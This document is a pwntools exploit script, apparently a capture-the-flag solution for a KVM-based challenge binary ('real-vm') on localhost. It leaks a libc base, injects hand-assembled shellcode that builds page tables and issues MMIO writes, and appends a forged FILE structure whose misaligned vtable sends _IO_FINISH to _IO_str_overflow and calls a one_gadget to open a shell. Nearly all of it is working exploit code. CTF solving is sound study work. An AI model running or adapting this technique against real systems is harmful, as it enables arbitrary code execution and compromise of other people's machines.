from pwn import *

context.log_level="debug"

#p=process("./real-vm")
p=remote("localhost",1337)

p.recvuntil(b"0x")
l3ak=p.recv(12)
print(l3ak)
libc = int(l3ak,16)-0x3c48e0
print(hex(libc))

# shellcode for page table + doing the mmio calls 

# mov    rax,0x2000
# mov    DWORD PTR [rax],0x3003
# mov    DWORD PTR [rax+0x1000],0x4003
# mov    DWORD PTR [rax+0x2000],0x5003
# mov    rax,0x5000
# mov    DWORD PTR [rax],0x3
# mov    DWORD PTR [rax+0x8],0x1003
# mov    DWORD PTR [rax+0x10],0x16003
# mov    rax,0x2000
# mov    cr3,rax
# mov    rax,0x2008
# mov    DWORD PTR [rax],0x1337
# mov    rax,0x2000
# mov    DWORD PTR [rax],0x1337
# mov    rdi,0x2010
# movabs rax,0x8500000195
# mov    DWORD PTR [rdi],0x1337
# mov    rax,0x2018
# mov    DWORD PTR [rax],0x1337
# hlt 

code=b"\x48\xC7\xC0\x00\x20\x00\x00\xC7\x00\x03\x30\x00\x00\xC7\x80\x00\x10\x00\x00\x03\x40\x00\x00\xC7\x80\x00\x20\x00\x00\x03\x50\x00\x00\x48\xC7\xC0\x00\x50\x00\x00\xC7\x00\x03\x00\x00\x00\xC7\x40\x08\x03\x10\x00\x00\xC7\x40\x10\x03\x60\x01\x00\x48\xC7\xC0\x00\x20\x00\x00\x0F\x22\xD8\x48\xC7\xC0\x08\x20\x00\x00\xC7\x00\x37\x13\x00\x00\x48\xC7\xC0\x00\x20\x00\x00\xC7\x00\x37\x13\x00\x00\x48\xC7\xC7\x10\x20\x00\x00\x48\xB8\x95\x01\x00\x00\x85\x00\x00\x00\xC7\x07\x37\x13\x00\x00\x48\xC7\xC0\x18\x20\x00\x00\xC7\x00\x37\x13\x00\x00\xF4"
one = libc+0x4527a
Payload=b""
Payload += p64(0)
Payload += p64(0)
Payload += b"A"*0x10
Payload += p64(0)
Payload += p64(0x1e1) # fix heap size --device=/dev/kvm
Payload += p64(0x00fbad8000) 
Payload += p64(0x0)*26
Payload += p64(libc+0x3c37b8-0x10) # misalign the vtable so that _IO_FINISH --> _IO_str_overflow
Payload +=p64(one) # we overwrite (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size) == onegadget 

# https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/strops.c#L107


code+=Payload

print(hex(one))
p.sendlineafter(b"Length\n",str(len(code)))
p.sendlineafter(b"Comrade\n",code)

print(len(code))
p.interactive()
